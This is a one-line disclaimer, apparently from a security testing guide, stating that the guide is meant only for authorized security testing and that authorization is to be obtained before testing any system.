*This guide is for authorized security testing only. Always obtain proper authorization before testing any system.*
